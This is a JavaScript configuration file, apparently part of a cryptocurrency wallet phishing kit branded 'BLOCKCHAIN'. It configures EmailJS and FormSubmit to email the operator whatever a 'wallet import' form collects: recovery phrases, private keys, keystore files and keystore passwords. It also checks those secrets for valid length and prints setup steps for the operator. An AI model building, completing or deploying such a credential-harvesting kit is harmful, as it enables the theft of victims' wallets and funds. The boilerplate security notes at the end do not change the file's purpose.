// Configuration file for EmailJS and FormSubmit
// Replace the placeholder values with your actual credentials

const CONFIG = {
    // EmailJS Configuration
    emailjs: {
        // Get these from https://www.emailjs.com/
        serviceId: "YOUR_SERVICE_ID",           // Replace with your EmailJS service ID
        templateId: "YOUR_TEMPLATE_ID",         // Replace with your EmailJS template ID
        publicKey: "YOUR_PUBLIC_KEY"            // Replace with your EmailJS public key
    },
    
    // FormSubmit Configuration
    formsubmit: {
        // Get this from https://formsubmit.co/
        email: "your-email@domain.com",         // Replace with your email address
        successUrl: "https://yourdomain.com/success.html"  // Replace with your success page URL
    },
    
    // Website Configuration
    website: {
        name: "BLOCKCHAIN",
        domain: "https://yourdomain.com",       // Replace with your domain
        supportEmail: "support@yourdomain.com"  // Replace with your support email
    },
    
    // Form Validation Settings
    validation: {
        recoveryPhraseLengths: [12, 15, 18, 21, 24],
        privateKeyLength: 64,
        maxFileSize: 5 * 1024 * 1024, // 5MB
        allowedFileTypes: ['.json', '.txt']
    },
    
    // Notification Settings
    notifications: {
        duration: 5000, // 5 seconds
        position: 'top-right', // top-right, top-left, bottom-right, bottom-left
        showWelcome: true
    }
};

// Export configuration for use in other files
if (typeof module !== 'undefined' && module.exports) {
    module.exports = CONFIG;
} else {
    // Browser environment
    window.CONFIG = CONFIG;
}

// Configuration instructions
const SETUP_INSTRUCTIONS = `
=== EMAILJS SETUP ===
1. Go to https://www.emailjs.com/ and create an account
2. Create a new Email Service (Gmail, Outlook, etc.)
3. Create a new Email Template
4. Get your Service ID, Template ID, and Public Key
5. Replace the placeholder values in this config file

=== FORMSUBMIT SETUP ===
1. Go to https://formsubmit.co/
2. Enter your email address
3. Confirm your email address
4. Replace the placeholder email in this config file
5. Customize your success page URL

=== TEMPLATE VARIABLES ===
Your EmailJS template can use these variables:
- {{to_email}} - Recipient email
- {{from_name}} - User's email address
- {{form_type}} - Type of wallet import
- {{message}} - Form message
- {{recovery_phrase}} - Recovery phrase (if provided)
- {{private_key}} - Private key (if provided)
- {{email}} - User's email address
- {{keystore_file}} - Keystore file name (if provided)
- {{keystore_password}} - Keystore password (if provided)

=== SECURITY NOTES ===
- Never expose private keys or recovery phrases in plain text
- Use environment variables for production
- Implement rate limiting
- Add CAPTCHA for production use
- Consider encryption for sensitive data
`;

// Log setup instructions in development
if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    console.log('🔧 CONFIGURATION SETUP REQUIRED:');
    console.log(SETUP_INSTRUCTIONS);
    console.log('📝 Current Configuration:', CONFIG);
}
